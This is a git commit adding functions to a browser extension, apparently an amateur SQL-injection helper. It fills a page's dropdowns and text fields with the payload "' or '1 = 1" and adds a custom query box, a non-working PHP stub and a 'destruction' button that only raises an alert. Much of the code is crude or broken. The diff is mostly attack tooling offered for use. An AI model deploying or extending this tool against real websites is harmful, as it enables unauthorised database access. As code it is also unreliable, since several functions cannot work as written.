e9e4bf3f2b6734a3ee4cfad74e21f66866b1156b
retropfilmz <61301467+retropfilmz@users.noreply.github.com>
2021-03-08 09:49:58 -0800

    V0.0.4 Added more functions
    Added an autofill for text boxes that is working. Added 3 other methods that may no be feasible and are subject to change.

--- sqlextension/content.js
+++ sqlextension/content.js
@@ -1,7 +1,6 @@
 'use strict';
 
 function dropdownInject(){
-  //Gather all the dropdown lists
   var dropdowns = document.getElementsByTagName('select');
 
   //If there are no dropdowns to inject, stop
@@ -12,20 +11,61 @@ function dropdownInject(){
 
   //Set injection tactic
   var injectionString = "<option value = \"\' or \'1 = 1\">Inject</option>"
-  //Replace dropdown option with injection
   for (var i = 0, l = dropdowns.length; i < l; i++) {
     dropdowns[i].innerHTML = injectionString + dropdowns[i].innerHTML;
   }
   alert("Injected");
 }
 
+function tfInject(){
+  var tfs = document.getElementsByTagName('input');
+  var injectionString = "<option value = \"\' or \'1 = 1\">Inject</option>"
+  for (var i = 0; i < tfs.length; i++){
+    tfs[i].value = injectionString;
+  }
+}
+
+function idTable(){
+  var listeners = getEventListeners();
+  //WIP
+}
+
+function customScriptBox(){
+  var originalHTML = document.getElementsByTagName('body');
+  var scriptbox = 'Insert Query Here: <input id=\"customquery\"></input> <button id=\"csb\">Submit</button>';
+  originalHTML[0].innerHTML = scriptbox + originalHTML[0].innerHTML; 
+  document.getElementById('csb').addEventListener('click', runcs);
+}
+
+function runcs(){
+  var query = document.getElementById('customquery');
+  var phpblock1 = "<?php";
+  var phpblock2 = "echo(did the php work);";
+  var phpblock3 = "?>";
+  var originalHTML = document.getElementsByTagName('body');
+  originalHTML[0].innerHTML = phpblock1 + phpblock2 + phpblock3 + originalHTML[0].innerHTML;
+  //alert(query.value);
+  
+}
+
 
 chrome.runtime.onMessage.addListener(
   function(request, sender, sendResponse) {
-    //alert(request.message);
     if (request.message === "inject_to_dropdowns"){
       dropdownInject();
       chrome.runtime.sendMessage({"message": "Injection Completed"})
+    }
+    else if (request.message === "textfield_to_inject"){
+      tfInject();
+    }
+    else if (request.message === "identify_table"){
+      idTable();
+    }
+    else if (request.message === "custom_script_box"){
+      customScriptBox();
+    }
+    else if (request.message === "destruction"){
+      alert("Crush Kill Destory");
     }
   }
 );
--- sqlextension/popup.js
+++ sqlextension/popup.js
@@ -7,4 +7,36 @@ function dropdownInject(){
     });
 }
 
+function tfToInject(){
+    chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
+        console.log(tabs[0].id);
+        chrome.tabs.sendMessage(tabs[0].id, {"message": "textfield_to_inject"});
+    });
+}
+
+function identifyTable(){
+    chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
+        console.log(tabs[0].id);
+        chrome.tabs.sendMessage(tabs[0].id, {"message": "identify_table"});
+    });
+}
+
+function customScriptBox(){
+    chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
+        console.log(tabs[0].id);
+        chrome.tabs.sendMessage(tabs[0].id, {"message": "custom_script_box"});
+    });
+}
+
+function destruction(){
+    chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
+        console.log(tabs[0].id);
+        chrome.tabs.sendMessage(tabs[0].id, {"message": "destruction"});
+    });
+}
+
 document.getElementById('dropdownInject').addEventListener('click', dropdownInject);
+document.getElementById('tfToInject').addEventListener('click', tfToInject);
+document.getElementById('identifyTable').addEventListener('click', identifyTable);
+document.getElementById('customScriptBox').addEventListener('click', customScriptBox);
+document.getElementById('destruction').addEventListener('click', destruction);
